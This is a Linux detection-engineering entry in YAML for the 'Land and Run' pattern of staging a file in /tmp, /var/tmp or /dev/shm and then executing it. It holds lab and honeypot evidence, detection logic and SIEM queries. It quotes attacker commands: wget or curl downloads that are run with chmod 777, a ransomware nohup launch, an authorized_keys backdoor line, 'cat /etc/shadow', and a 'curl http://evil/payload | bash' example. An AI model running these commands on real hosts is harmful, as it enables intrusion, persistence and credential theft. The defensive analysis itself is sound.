# Lab-validated chokepoint entry.
# Evidence: auditd + Sysmon for Linux telemetry from two throwaway Azure VMs
# (Debian 12, Rocky 9), authorized assumed-breach exercise 2026-09-28.
# Operator: SancLogic. Target operator: JFrank.
# Field grounding: C0XMO (Gafgyt variant), Rocke cryptomining group, UNC3944.
# Prior evidence: 153-day SSH honeypot observed the same staging pattern.
#
# Key change from v1: SSH is now one delivery vector, not the frame. The
# invariant is file-backed staging in a shared-writable directory followed by
# execution. In-memory pipes (190 sessions) are explicitly out of scope.
Name: Linux Shared-Writable Staging to Execution (Land and Run)
PageStandardVersion: 1
Id: 5e2a9c47-8b13-4f06-a1d5-3c7e9b2f6a80
MitreIds:
  - T1105
  - T1059.004
  - T1053.003
DetectionPriority: HIGH
Tactics:
  - Command and Control
  - Execution
  - Persistence
Techniques:
  - Ingress Tool Transfer
  - 'Command and Scripting Interpreter: Unix Shell'
  - 'Scheduled Task/Job: Cron'
ThreatPrevalence: HIGH
DetectionDifficulty: LOW
Description: >
  Code that lands on a Linux host as a file in a shared-writable
  directory (/tmp, /dev/shm, /var/tmp) must be written before it
  can be consumed. The write generates a file-creation event;
  direct execution generates an execve, while interpreter or
  loader consumption may instead be visible through command-line
  arguments or file-access telemetry (see BN-04). Delivery
  method changes (scp, wget, C2 upload, heredoc, lateral scp),
  execution method changes (bash, chmod+exec, python3, cron,
  nohup), but the file-write event does not. This covers file-backed staging only. Stdin-only
  execution (curl | bash with no file on disk) and memory-only
  execution (memfd_create) are out of scope. Lab-validated across
  8 delivery/execution variants, a Sliver C2 implant, and a
  lateral movement hop on Debian 12 and Rocky 9 with auditd and
  Sysmon for Linux. Of ~80k total log lines captured, ~780 were
  operator-attributable exec events. Same pattern seen in the wild:
  C0XMO writes to /tmp/.cache, chmod 777, executes, deletes. Rocke
  group stages to /var/tmp with cron persistence via /var/spool/cron.
  On a 153-day SSH honeypot, 4,703 of the 5,020 sessions with
  stage, execute, or in-memory activity (93.69%) wrote to a
  shared-writable directory and then executed or scheduled the file
  from there. The detection has to join on the file path, not the
  delivery session, because 86.22% of the linked runs were only
  scheduled with a cron line and would start later under crond.
LastUpdated: '2026-10-04'
Author: Jenna Frank
CoConspirator: SancLogic

TheConstant: >
  New code staged as a file in a shared-writable directory must be written
  before it can be consumed. The delivery method (SSH channel, wget, curl,
  scp, web shell) and the launcher (the session shell, cron, systemd,
  nohup) can change; the file write and the consumption cannot. Direct
  execution is visible through execve; interpreter or loader consumption
  may instead be visible through command-line arguments or file-access
  telemetry (see BN-04 for the source-builtin exception where no new
  execve fires). This chokepoint covers file-backed staging only. Code
  piped directly into an interpreter with no file written (190 honeypot
  sessions) and code passed as a command-line argument (python -c, perl -e)
  are out of scope and need a separate process-lineage rule.

Prerequisites:
  - A Linux host with /tmp, /var/tmp or /dev/shm present (virtually all distributions)
  - Code that is not already on the host (living-off-the-land commands with no new code are out of scope)
  - File-create telemetry with the writing process (Sysmon for Linux Event ID 11, or auditd watches on writable paths)
  - Process-creation telemetry for every parent, including crond and systemd (Sysmon for Linux Event ID 1, or auditd execve)

AttackerControls:
  - Delivery method (scp, wget, curl, heredoc, C2 upload, lateral scp)
  - Execution method (direct binary, bash, sh, python3, perl, cron, nohup)
  - File naming and path within staging directories
  - Timing between staging and execution
  - Whether to use dot-prefix for hiding

AttackerCannotControl:
  - The file write to a staging directory generating a kernel-mediated event
  - The consumption of the staged file generating observable telemetry (execve for direct execution; command-line arguments or file-access events for interpreter consumption)
  - The fact that both events are host-local and linkable by path
  - That tmpfs-backed paths (/dev/shm) still generate file-write events

Chokepoints:
  - Stage: Land
    Input: Attacker has a way to write files on the host (SSH session, download utility, web shell, supply-chain implant)
    Invariant: The payload must be written as a file to a path the system can execute.
    Observable: >
      auditd file-write event with key file_land on /tmp, /dev/shm, /var/tmp,
      /var/spool/cron; Sysmon for Linux EID 11 (FileCreate). Lab evidence:
      26 file_land events on deb12, 30 on rocky9 — every delivery method
      (scp, heredoc, base64, echo pipe, python write, C2 upload, lateral scp)
      generated at least one file_land event. Wild evidence: C0XMO writes
      to /tmp/.cache via wget; Rocke stages to /var/tmp via curl/wget.
    WhyCantBypass: >
      Code that is not on the host has to arrive and be stored somewhere before
      it can run. On the honeypot the 4,703 staged-then-executed sessions
      arrived by stdin-to-file (4,055), download-to-file (463) and scp pull
      (185). The method changed; the file write did not. The same pattern
      appears in the wild: C0XMO/Gafgyt writes to /tmp/.cache, Rocke writes
      to /var/tmp/kworkerds, and UNC3944 stages in /tmp on ESXi hosts. Even
      memory-backed tmpfs (/dev/shm) generates file-write events because
      the kernel mediates the write. C2 uploads via Sliver still write to the
      target filesystem — lab evidence: Sliver upload to /dev/shm/.cache
      triggered file_land. Lateral movement SCP from rocky9 to deb12
      (/tmp/.svc) also triggered file_land on the second host.
    LogSources:
      - Sysmon for Linux Event ID 11 (File Create)
      - "auditd: syscall watch -w /tmp -p wa -k file_land (and /dev/shm, /var/tmp, /var/spool/cron)"
    DetectionTier: Research
    SigmaRef: sigma-rules/ssh-land-and-run/research.yml
    BypassNote: >
      Code piped straight into an interpreter writes no file (190 honeypot
      sessions, out of scope). Code passed as a command-line argument
      (python -c, perl -e) writes none either. Files written outside the
      three staging directories (home directories, /usr/local/bin) are outside
      this rule's scope but use the same write-then-execute pattern.
    BypassNotes:
      - Id: BN-01
        Title: SSH authorized_keys persistence not caught
        Description: >
          authorized_keys injection to ~/.ssh produced zero file_land events
          because the watch paths do not include home directories. Lab evidence:
          echo "ssh-rsa AAAAB3FakeKeyForLabAAAA attacker@c2" >> ~/.ssh/authorized_keys
          on rocky9 generated no file_land. Recommend adding
          -w /root/.ssh -p wa -k persist_keys and per-user ~/.ssh equivalents.
        MitreRef: T1098.004
      - Id: BN-02
        Title: Sensitive file reads invisible
        Description: >
          cat /etc/shadow generated only a generic cat execve with no target
          file visibility. file_land is write/attr only (-p wa) and does not
          watch /etc/shadow for reads. Lab evidence: credential harvesting on
          both hosts produced exec_log for cat but no file_land for the read
          target. Recommend a read watch (-w /etc/shadow -p r) or
          execve+argument correlation.
        MitreRef: T1003.008
      - Id: BN-03
        Title: High noise from system activity requires baseline tuning
        Description: >
          Raw exec volume was dominated by system activity. Of ~38k total exec
          events across both hosts, only ~780 were operator-attributable
          (auid=sanc). Major noise sources: dracut initramfs rebuild, iptables
          (6,813 events), pidof (1,701 events), systemd-private tmp churn.
          A noise baseline excluding systemd-private-* and dracut initramfs
          paths is needed before this is analyst-usable.
  - Stage: Run
    Input: The payload is on the host as a file
    Invariant: Some process must consume the staged file, either directly by path or through an interpreter.
    Observable: >
      Direct execution: auditd execve with the staged path as exe;
      Sysmon EID 1 with Image under a staging directory. Lab evidence:
      T02 chmod+exec and Sliver /tmp/.update hit the direct path.
      Interpreter execution: auditd execve for the interpreter with
      the staged path in argv; Sysmon EID 1 with CommandLine containing
      the staged path. Lab evidence: T01 bash, T03 heredoc, T04 base64,
      T06 python3 hit the interpreter path. T05 source is a known gap
      (see BN-04). Wild evidence: C0XMO uses direct execution
      (./.cache after chmod 777).
    WhyCantBypass: >
      A file that is never executed has no effect. The honeypot showed three
      launchers: a direct run in the session (648 sessions), a cron line only
      (4,055), and a run from a separate SSH connection seconds later (2
      sessions from src-5063). In the wild, C0XMO runs ./tmp/.cache directly,
      Rocke uses nohup /var/tmp/kworkerds, and UNC3944 uses nohup sh -c
      'sleep 14400 && /encrypt_.out'. The launcher varies; the execution
      does not. A file on disk that does nothing is not a threat. To have
      effect, something must read and act on it. Direct execution goes through
      execve. Interpreter consumption is visible through execve for the
      interpreter plus the staged path in its command-line arguments.
      The source builtin (BN-04) is the exception: no new execve fires,
      but file_land still catches the staging write.
    LogSources:
      - Sysmon for Linux Event ID 1 (Process Creation)
      - "auditd: -a always,exit -F arch=b64 -S execve -F key=exec_log (and b32)"
    DetectionTier: Hunt
    SigmaRef: sigma-rules/ssh-land-and-run/hunt.yml
    BypassNote: >
      Running from a staging directory is common for installers and build
      tools, so this tier is for hunting, not alerting.
    BypassNotes:
      - Id: BN-04
        Title: Source builtin produces no new execve for the script
        Description: >
          T05 used source (.) to execute /tmp/t05.sh. The sourced script
          runs in the current bash process — no new execve fires for the
          script itself. Only external commands called by the sourced script
          (logger in this case) generate exec_log. A sourced script using
          only shell builtins would be invisible to execve-based detection.
          file_land still catches the staging write.
  - Stage: Land Then Run on the Same Host
    Input: A staged file and a later execution of the same path
    Invariant: The executed path must be the path that was written, on the same host.
    Observable: >
      A file create under a staging directory followed within 2 hours by a
      process whose Image is that same path, on the same host. Lab evidence:
      every land method hit file_land; every run method except source
      (BN-04) hit exec_log;
      the lateral-movement hop proves the same pattern fires on internal
      redeployment from a second host (T1021.004 / T1570).
    WhyCantBypass: >
      Joining on host and file path, not the delivery session, links a stage
      and a run even when they happen in different connections or when cron or
      systemd starts the file after the session ends.
    LogSources:
      - Sysmon for Linux Event IDs 1 and 11
      - auditd execve plus file watches
    DetectionTier: Analyst
    SigmaRef: sigma-rules/ssh-land-and-run/analyst.yml
    BypassNote: >
      This rule catches direct execution only (Image under a staging
      directory). Runs through an interpreter (sh /tmp/w.sh, perl
      /tmp/solid.pl) have the path in CommandLine, not Image — those are
      caught by the hunt rule. The full temporal correlation (file created
      then executed on the same host) requires SIEM-specific queries
      because it joins two logsource categories; see the RequiredCorrelation
      section for Splunk and Elastic EQL examples. @reboot cron schedules
      fall outside any short time window.

Variations:
  - Name: 'C0XMO/Gafgyt: SSH brute force, wget to /tmp, direct execution with cron persistence'
    FirstSeen: '2026-03'
    Status: Active
    SourceURL: https://www.fortinet.com/blog/threat-research/inside-cross-platform-propagation-of-new-gafgyt-variant-c0xmo
    NotesShort: 'wget -O /tmp/.cache; chmod 777 .cache; ./.cache; copies to /var/tmp/.sys, /dev/shm/.sys with cron */15'
    Notes: >
      C0XMO is a Gafgyt variant that brute-forces SSH, then stages and
      executes from shared-writable directories. The attack chain:
      cd /tmp; wget -q -O .cache; chmod 777 .cache; ./.cache; rm -f .cache.
      It copies itself to /tmp/.sys, /var/tmp/.sys, /dev/shm/.sys and
      $HOME/.sys (chmod 755), and persists with cron (*/15 * * * *) and
      shell profile modification (~/.bashrc, ~/.profile, ~/.bash_profile).
      The file write to /tmp and the direct execution are the invariant;
      the secondary copies to /var/tmp and /dev/shm also land in this
      chokepoint's staging directories.
    ChokepointMapping: 'SSH brute force -> cd /tmp -> wget -O .cache (land) -> chmod 777 -> ./.cache (run) -> cp to /var/tmp/.sys, /dev/shm/.sys -> cron */15 (persistence)'
    Command:
      Invocation: 'cd /tmp; wget -q hxxp://[C2]/bot[.]arch -O .cache; chmod 777 .cache; ./.cache; rm -f .cache'
      Artifacts:
        - 'Fortinet FortiGuard Labs, C0XMO analysis, 2026'
  - Name: 'Rocke Group: cryptominer staged to /var/tmp with cron and systemd persistence'
    FirstSeen: '2019-01'
    Status: Active
    SourceURL: https://www.zscaler.com/blogs/cybersecurity-best-practices/rocke-cryptominer
    NotesShort: 'curl/wget to /var/tmp/kworkerds; nohup execution; cron */10 with pastebin stager'
    Notes: >
      Rocke Group targets cloud Linux hosts, staging the XMRig miner as
      /var/tmp/kworkerds (masquerading as a kernel thread name) with its
      config at /var/tmp/config.json. Delivery: curl -fsSL -o
      /var/tmp/kworkerds || wget -O /var/tmp/kworkerds, chmod +x, nohup
      /var/tmp/kworkerds >/dev/null 2>&1 &. Persistence: cron scripts in
      /etc/cron.hourly/oanacroner, /etc/cron.daily/oanacroner,
      /etc/cron.monthly/oanacroner, and direct crontab modification with
      */10 * * * * piping a Pastebin URL to sh. Also installs a systemd
      service (sshservice.service) and modifies /etc/bashrc. The write to
      /var/tmp and the nohup execution are the invariant stages.
    ChokepointMapping: 'curl/wget -> /var/tmp/kworkerds (land) -> chmod +x -> nohup /var/tmp/kworkerds (run) -> cron */10 pastebin|sh (persistence)'
    Command:
      Invocation: '(curl -fsSL --connect-timeout 120 hxxps://master[.]minerxmr[.]ru/One/x1 -o /var/tmp/kworkerds||wget hxxps://master[.]minerxmr[.]ru/One/x1 -O /var/tmp/kworkerds) && chmod +x /var/tmp/kworkerds'
      Artifacts:
        - 'Red Canary / Zscaler, Rocke cryptominer analysis, 2019'
        - 'Intezer, Rocke Group analysis, 2021'
  - Name: 'UNC3944: SCP to /tmp on ESXi, nohup execution with time delay'
    FirstSeen: '2025-07'
    Status: Active
    SourceURL: https://cloud.google.com/blog/topics/threat-intelligence/defending-vsphere-from-unc3944/
    NotesShort: 'SCP ransomware to /tmp/encrypt.out; chmod 0777; nohup with 4-hour sleep'
    Notes: >
      UNC3944 (Scattered Spider) pushes ransomware binaries to /tmp on ESXi
      hosts via SCP/SFTP over SSH. The chain: chmod 0777 encrypt.out; cp
      encrypt.out encrypt_.out; nohup sh -c 'sleep 14400 && /encrypt_.out
      -pass [key] -skip_vms /list.txt' &. The 4-hour sleep delay means the
      execution happens long after the SSH session ends. The file write to
      /tmp and the later execution are the invariant. Also installs Teleport
      as a persistent backdoor at /usr/local/bin/teleport with a systemd
      unit. While this is ESXi-specific, the staging pattern (/tmp write,
      chmod, delayed execution) is the same chokepoint.
    ChokepointMapping: 'SSH/SCP -> /tmp/encrypt.out (land) -> chmod 0777 -> nohup sh -c sleep && /encrypt_.out (run, delayed 4h)'
    Command:
      Invocation: 'chmod 0777 encrypt.out; cp encrypt.out encrypt_.out; nohup sh -c ''sleep 14400 && /encrypt_.out -pass [REDACTED] -skip_vms /list.txt'' &'
      Artifacts:
        - 'Google Cloud Threat Intelligence, UNC3944/Scattered Spider analysis, 2025'
  - Name: Payload over the SSH channel, run by cron (honeypot)
    FirstSeen: '2026-04'
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1053/003/
    NotesShort: cat > w.sh from stdin, then a cron line; never run inside the session
    Notes: >
      4,055 honeypot sessions. The loader writes w.sh from the SSH channel's
      stdin, marks it executable, schedules it @reboot and hourly with a cron
      line, and adds a systemd user unit. None of the 4,117 cat > file
      sessions ran its file directly. On a real host the run would start under
      crond, outside the SSH session. The stdin bytes and the unit body were
      not captured. SSH is the delivery vector here; the chokepoint is the
      file write to /tmp and the cron-scheduled execution.
    ChokepointMapping: 'sshd shell -> cat > /tmp/w.sh (land) -> chmod +x -> crontab @reboot / hourly -> crond runs w.sh (run, deferred)'
    Command:
      Invocation: 'cd "/tmp" && if [ ! -f "w[.]sh" ]; then cat > "w[.]sh" && chmod +x w[.]sh; fi'
      Artifacts:
        - 'Honeypot transcript, session 8596ef87-77a4-4b79-afcb-ddc279fe4ace'
  - Name: Download to a file, run directly (honeypot)
    FirstSeen: '2026-05'
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1105/
    NotesShort: wget -O bot; chmod 777 bot; ./bot
    Notes: >
      463 staged-then-executed honeypot sessions first staged with a download
      to a file. Most run the file in the same request, so the stage-to-run
      gap is logging resolution (direct runs: median 0.00 s, p90 0.11 s, max
      14.81 s). This is the same pattern as C0XMO and Rocke in the wild.
    ChokepointMapping: 'sshd shell -> wget -O bot (land) -> chmod 777 -> ./bot (run)'
    Command:
      Invocation: 'wget hxxp://src-3856:8080/bot.amd64 -O bot; chmod 777 bot; ./bot telnet.amd64; rm -f bot'
      Artifacts:
        - 'Honeypot transcript, session ae6fc296-6cd7-4590-a316-8721cf8a4e96'
  - Name: scp pull with an embedded key, run through sh (honeypot)
    FirstSeen: '2026-06'
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1021/004/
    NotesShort: scp -i key.ppk user@host:sh out_sh, then sh out_sh; curl | sh fallback
    Notes: >
      185 honeypot sessions from 3 sources. The loader writes an embedded
      private key, pulls its payload with scp, and runs it with sh. If scp
      fails it falls back to curl piped to sh. No wget or curl runs when scp
      succeeds, so a download-utility rule misses it; a file-then-execute
      join does not. This variation shows interpreter consumption: Image is
      sh, the staged path is in CommandLine.
    ChokepointMapping: 'sshd shell -> scp pull to /tmp/out_sh (land) -> sh /tmp/out_sh (run; Image is sh, path in CommandLine)'
    Command:
      Invocation: 'cd /tmp; echo ''<private-key-redacted>'' > key.ppk; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@dst-002:sh out_sh; ...'
      Artifacts:
        - 'Honeypot transcript, session 7a0ffac4-1397-463f-a8dd-4fcd3061f985'
  - Name: Stage and run split across SSH connections (honeypot)
    FirstSeen: '2026-09'
    Status: Active
    SourceURL: https://attack.mitre.org/techniques/T1059/004/
    NotesShort: scp -t push in one connection, run 3 seconds later in the next
    Notes: >
      2 honeypot sessions from one source (src-5063). It pushed a file with
      scp -t, then ran perl /tmp/solid.pl 3 seconds later in a new SSH
      connection, and later repeated this with an archive (tar zxfv m.tgz;
      ./go). A per-session correlation misses both halves; a join on the
      file path does not. The archive case also shows why file-create events
      beat command-line name matching: tar writes files whose names the
      command line never shows.
    ChokepointMapping: 'connection 1: scp -t /tmp/solid.pl (land) -> connection 2: perl /tmp/solid.pl (run)'
    Command:
      Invocation: 'perl /tmp/solid.pl >/dev/null 2>&1;rm -rf /tmp/solid*;uname -a'
      Artifacts:
        - 'Honeypot transcript, session 81442679-d87f-4e90-84f1-bf335ea61fbc'

Detections:
  - Level: Research
    Description: >
      Files created in /tmp, /var/tmp or /dev/shm — baseline of what
      normally writes to staging directories.
    LogSources:
      - Sysmon for Linux Event ID 11
      - auditd file watches (-w /tmp -p wa -k file_land)
    Logic: 'Any file created under /tmp/, /var/tmp/ or /dev/shm/. Baseline of which processes and users normally write there.'
    ExpectedFPRate: High
    UseCase: Learning normal staging-directory writes before tuning the hunt and analyst tiers
    SigmaRule: sigma-rules/ssh-land-and-run/research.yml
    Validation:
      RuleStatus: Experimental
      State: Lab-validated
      TestedOn:
        - Debian 12 (6.1.0-53-cloud-amd64) with auditd + Sysmon for Linux 1.5.3
        - Rocky Linux 9.8 (5.14.0-687) with auditd + Sysmon for Linux 1.5.3
      Backends:
        - sigma-cli 3.1.0 / pySigma 1.5.1 (sigma check and EQL/Lucene conversion via pySigma-backend-elasticsearch)
      Notes: >
        Lab-validated 2026-09-28. All 8 delivery methods generated file_land
        events: 26 on deb12, 30 on rocky9. High noise from system activity
        confirmed — baseline tuning required.
  - Level: Hunt
    Description: >
      A process run from a staging directory (direct execution) or an
      interpreter consuming a file from a staging directory (interpreter
      execution), filtering known system paths.
    LogSources:
      - Sysmon for Linux Event ID 1
      - auditd execve
    Logic: >
      Direct: Image starts with /tmp/, /var/tmp/ or /dev/shm/.
      Interpreter: Image is a known interpreter (bash, sh, python3, python,
      perl) and CommandLine contains a staging directory path. Both exclude
      systemd-private, dracut, and initramfs paths.
    CorrelationNote: >
      These rules surface candidate events. Correlation of file_land and
      exec_log by host, staged path, and time window is performed at the
      hunt workflow level, not within the individual Sigma rules.
    ExpectedFPRate: Medium
    UseCase: Hunting for execution from staging directories
    SigmaRule: sigma-rules/ssh-land-and-run/hunt.yml
    Validation:
      RuleStatus: Experimental
      State: Lab-validated
      TestedOn:
        - Debian 12 (6.1.0-53-cloud-amd64) with auditd + Sysmon for Linux 1.5.3
        - Rocky Linux 9.8 (5.14.0-687) with auditd + Sysmon for Linux 1.5.3
      Backends:
        - sigma-cli 3.1.0 / pySigma 1.5.1 (sigma check and EQL/Lucene conversion via pySigma-backend-elasticsearch)
      Notes: >
        Lab-validated 2026-09-28. Direct execution (T02 chmod+exec, Sliver
        /tmp/.update) matched selection_direct. Interpreter execution
        (T01 bash, T03 heredoc, T04 base64, T06 python3) matched
        selection_interpreter via CommandLine. T05 source is a known
        gap (BN-04). System noise filters reduce volume significantly.
  - Level: Analyst
    Description: >
      Hidden (dot-prefixed) file execution from staging directories,
      either direct (binary at /tmp/.) or via interpreter (bash /tmp/.x),
      or cron-launched execution from staging paths.
    LogSources:
      - Sysmon for Linux Event ID 1
      - auditd execve
    Logic: >
      Direct: Image starts with /tmp/., /dev/shm/., or /var/tmp/.
      Interpreter: a known interpreter with a dot-prefixed staging path
      in CommandLine. Cron: ParentImage ends with /cron and Image starts
      with a staging directory. Low false-positive: legitimate software
      rarely uses hidden files in /tmp.
    CorrelationNote: >
      These rules surface candidate events. Correlation of file_land and
      exec_log by host, staged path, and time window is performed at the
      hunt workflow level, not within the individual Sigma rules.
    ExpectedFPRate: Low
    UseCase: SOC-deployable alerting on hidden-file execution from staging directories
    SigmaRule: sigma-rules/ssh-land-and-run/analyst.yml
    Validation:
      RuleStatus: Experimental
      State: Lab-validated
      TestedOn:
        - Debian 12 (6.1.0-53-cloud-amd64) with auditd + Sysmon for Linux 1.5.3
        - Rocky Linux 9.8 (5.14.0-687) with auditd + Sysmon for Linux 1.5.3
      Backends:
        - sigma-cli 3.1.0 / pySigma 1.5.1 (sigma check and EQL/Lucene conversion via pySigma-backend-elasticsearch)
      Notes: >
        Lab-validated 2026-09-28. The Sliver implant at /tmp/.update, the
        reverse shell at /dev/shm/.cache, and the staging payload at
        /dev/shm/.payload all match the dot-prefix selection. When crond
        later executes a staged file from /tmp, the cron-from-staging
        selection catches the child process. C0XMO /tmp/.cache would also
        match the dot-prefix selection. The full temporal write-then-execute
        correlation requires SIEM-specific queries (see RequiredCorrelation).

RequiredCorrelation:
  InterpreterConsumption:
    Description: >
      The Sigma analyst rule (analyst.yml) detects hidden-file execution
      from staging directories by matching Image or CommandLine paths. It
      does not join file-creation events to process-creation events — that
      temporal correlation (a file written, then executed on the same host)
      requires a backend-specific query. When the staged file is consumed by
      an interpreter (sh /tmp/w.sh, perl /tmp/solid.pl, python3
      /dev/shm/loader.py), Image is the interpreter binary (/usr/bin/sh),
      not the staged path. The staged path appears in CommandLine. Standard
      Sigma correlation cannot join on a substring of CommandLine, so a
      backend-specific query is required.
    BackendQuery: >
      Join file_event.TargetFilename to process_creation.CommandLine where
      CommandLine contains the TargetFilename value, the process Image is a
      shell or scripting interpreter (/bin/sh, /bin/bash, /usr/bin/perl,
      /usr/bin/python*), and both events share the same host, within 2 hours,
      with the file event preceding the process event.
      Example Splunk:
        index=linux sourcetype=sysmon EventCode=11 TargetFilename="/tmp/*" OR TargetFilename="/var/tmp/*" OR TargetFilename="/dev/shm/*"
        | rename TargetFilename AS staged_path, _time AS land_time
        | join Computer, staged_path [search index=linux sourcetype=sysmon EventCode=1 (Image="*/sh" OR Image="*/bash" OR Image="*/perl" OR Image="*/python*") (CommandLine="* /tmp/*" OR CommandLine="* /var/tmp/*" OR CommandLine="* /dev/shm/*") | rex field=CommandLine "(?<staged_path>/(?:tmp|var/tmp|dev/shm)/\S+)" | rename _time AS run_time]
        | where run_time > land_time AND run_time - land_time < 7200
      Example Elastic EQL (coarse sequencing — does not enforce the same
      file path between write and execute events; use process.command_line
      filtering to narrow):
        sequence by host.name with maxspan=2h
          [file where file.path : ("/tmp/*", "/var/tmp/*", "/dev/shm/*")]
          [process where process.executable : ("*/sh", "*/bash", "*/perl", "*/python*") and process.command_line : ("* /tmp/*", "* /var/tmp/*", "* /dev/shm/*")]
    HoneypotEvidence: >
      On the honeypot, 185 scp-pull sessions ran the staged file through
      sh (sh out_sh), and 2 sessions ran perl /tmp/solid.pl. Both have
      Image as the interpreter, not the staged path. The hunt rule catches
      these individually; this correlation is needed to tie them back to
      the file-create event.

ScopeExclusions:
  - "Stdin-only execution: e.g. ssh target 'bash -s' < script.sh or curl http://evil/payload | bash. No file touches disk, so file_land does not fire."
  - "Memory-only execution: e.g. memfd_create payloads that never write to a filesystem path. No staging directory is used."
  - "Shell builtins executed via source: the sourced script runs in the current process with no new execve for the script itself. External commands called by the sourced script do generate execve."

HoneypotMethodology:
  Dataset: >
    153-day SSH honeypot (2026-04-27 to 2026-09-26 UTC), single sensor,
    asyncssh-based. Every credential accepted; command transcripts recorded
    from an emulated shell. No process telemetry — these are command-line
    transcripts, not endpoint logs. Operator sessions excluded.
  CountingScript: queries/30_land_and_run.py
  CountingResults: land_and_run.json
  EvidencePack: evidence-pack-v2/
  Denominator: >
    69,979 sessions with at least one command. 5,224 of these (7.47%) had
    at least one stage, in-memory, execute, or execute-like event.
  ClassificationRules: >
    Each session is classified by text-pattern matching on its command
    transcript (not by process telemetry). A "stage" is a file write to
    a shared-writable directory (cat > /tmp/x, wget -O /tmp/x, scp sink).
    An "execute" is a direct run (./x, /tmp/x), an interpreter invocation
    (bash /tmp/x, perl /tmp/x), or a cron/systemd reference naming the
    staged file. chmod alone is not an execute. Stage-to-execute linking
    requires the normalised filename to match within the same session,
    with the stage preceding the execute in segment order.
  KeyFigures:
    - Figure: '4,703 staged-then-executed sessions'
      Derivation: >
        Sessions where a file was written to a staging directory AND the
        same filename was later executed or referenced in a cron/systemd
        line within the same session. Breakdown by delivery method:
        stdin-to-file 4,055; fetch-to-file (wget/curl) 463; scp pull 185.
      LedgerID: L02
    - Figure: '5,020 sessions with stage, execute, or in-memory activity'
      Derivation: >
        4,703 (staged-then-executed) + 190 (in-memory pipe-to-interpreter)
        + 124 (staged, never executed in session) + 3 (executed, no
        observed staging). The 204 "execute-like, nothing new" sessions
        (RouterOS probes, system binaries, reverse-shell one-liners) are
        excluded because they run nothing the session staged.
      LedgerID: L01, L02
    - Figure: '93.69% wrote to a shared-writable directory'
      Derivation: '4,703 / 5,020 = 93.69%. Denominator is the 5,020 above.'
      LedgerID: L02
    - Figure: '86.22% linked runs were cron-scheduled only'
      Derivation: '4,055 / 4,703 = 86.22%. These sessions wrote a cron line referencing the staged file but never ran it directly.'
      LedgerID: L03
  Limitations:
    - The honeypot records command text, not syscalls. Classification is by text pattern matching, not process telemetry.
    - Every login is accepted; failed and abandoned authentications are not recorded.
    - stdin and scp payload contents are not captured — only the command that wrote them.
    - Timestamps are emulation-completion times from the fake shell, not kernel event times.
    - Single sensor, single location — geographic and network diversity is limited.

